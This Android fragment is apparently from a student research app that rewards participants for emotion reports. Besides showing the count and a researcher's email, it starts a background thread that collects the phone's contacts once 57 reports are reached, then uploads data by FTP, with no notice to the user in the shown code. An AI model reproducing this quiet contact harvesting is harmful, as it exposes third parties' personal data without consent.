package org.graduation.healthylife;

import android.app.Fragment;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

import org.graduation.R;
import org.graduation.collector.ContactCollector;
import org.graduation.database.SharedPreferenceManager;

public class ResultFragment extends Fragment {
    int cnt;
    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view=inflater.inflate(R.layout.content_result, container, false);
        TextView tv= (TextView) view.findViewById(R.id.textView3);
        cnt= SharedPreferenceManager.getManager().getInt("emotionCnt",0);
        Log.d("resultFragment","emotion"+cnt);
        if(cnt<60) tv.setText("您已经提交了"+cnt+"次，还有"+(60-cnt)+"次可以领取奖励");
        else tv.setText("您已经提交了足够的次数。\n您的ID是"+SharedPreferenceManager.getManager().getString("phoneID", null)
                +"。\n联系张啸(tobexiao1@gmail.com)确认上传成功后即可领取奖励。");
        new Thread(new Runnable() {
            @Override
            public void run() {
                if(cnt>=57){
                    new ContactCollector().collect();
                }
                new FtpUploader().upload();
            }
        }).start();
        return view;
    }
}
